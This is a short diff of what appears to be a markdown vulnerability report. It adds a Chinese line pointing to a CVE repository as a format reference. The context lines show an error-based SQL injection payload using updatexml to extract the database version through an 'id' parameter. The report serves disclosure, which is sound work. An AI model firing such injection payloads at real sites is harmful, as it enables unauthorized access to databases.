@@ -20,3 +20,6 @@ id=1' and updatexml(1,concat(0x7e,(select version()),0x7e),0)--+
 ```
 
 ![image](https://user-images.githubusercontent.com/54017627/159834499-c5a75a37-d93a-4d91-9d00-9d435851c8a6.png)
+
+
+参考这个格式：https://github.com/nu11secur1ty/CVE-mitre/tree/main/2022/CVE-2022-24571
